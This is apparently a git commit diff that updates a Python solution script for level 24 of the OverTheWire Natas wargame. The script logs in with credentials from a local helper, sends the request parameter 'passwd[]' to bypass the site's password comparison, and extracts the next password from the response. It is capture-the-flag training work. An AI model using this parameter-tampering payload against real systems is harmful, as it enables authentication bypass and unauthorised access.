a921ca1a7394564963238eb82afae3c0f6ae4003
Taldgan <bananaphone993@live.com>
2020-07-29 07:43:28 -0500

    24 beat

--- natas/rerun/scripts/natas24solution.py
+++ natas/rerun/scripts/natas24solution.py
@@ -5,12 +5,12 @@ from requests.auth import HTTPBasicAuth
 
 def inject_payload():
     #Username and Password for natas website/level
-    passw = subprocess.run(['getpass', '23'], stdout=subprocess.PIPE).stdout.decode('utf-8')
-    auth = HTTPBasicAuth('natas23', passw.strip())
-    payload={'passwd':'11iloveyou'}
+    passw = subprocess.run(['getpass', '24'], stdout=subprocess.PIPE).stdout.decode('utf-8')
+    auth = HTTPBasicAuth('natas24', passw.strip())
+    payload={'passwd[]':''}
     #Get request to website, creates object that contains a .text property
     #text property holds the html of the webpage
-    r = requests.get('http://natas23.natas.labs.overthewire.org/', auth=auth, params=payload)
+    r = requests.get('http://natas24.natas.labs.overthewire.org/', auth=auth, params=payload)
     passreg = '[a-zA-Z0-9]{32}'
     print(re.findall(passreg, r.text)[1])
 
